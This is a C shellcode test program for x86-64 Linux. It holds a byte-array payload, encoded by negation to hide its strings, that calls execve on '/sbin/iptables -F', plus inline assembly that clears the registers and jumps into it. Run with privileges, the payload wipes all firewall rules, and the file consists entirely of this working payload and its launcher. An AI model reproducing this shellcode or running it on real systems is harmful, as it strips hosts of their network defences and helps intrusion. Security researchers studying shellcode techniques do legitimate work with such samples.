#include <stdio.h>
#include <string.h>
 

unsigned char shellcode[] = "\x48\x31\xc0\x99\x50\x66\x68\xd3\xb9\x48\x89\xe1\x66\xf7\x19\x48\xbb\x8c\x9e\x9d\x93\x9a\x8c\xff\xff\x53\x48\xbb\xd1\x8c\x9d\x96\x91\xd0\x96\x8f\x53\x48\x89\xe7\x48\xf7\x1c\x24\x48\xf7\x5c\x24\x08\x50\x51\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

int 
main(void)
{       


        printf("Shellcode length: %d\n", (int)strlen(shellcode));

      __asm__ (        
                "mov $0xffffffffffffffff, %rax\n\t"
                "mov %rax, %rbx\n\t"
                "mov %rax, %rcx\n\t"
                "mov %rax, %rdx\n\t"
                "mov %rax, %rsi\n\t"
                "mov %rax, %rdi\n\t"
                "mov %rax, %rbp\n\t"
                "call shellcode"
        );

        

        return 0;

}
 
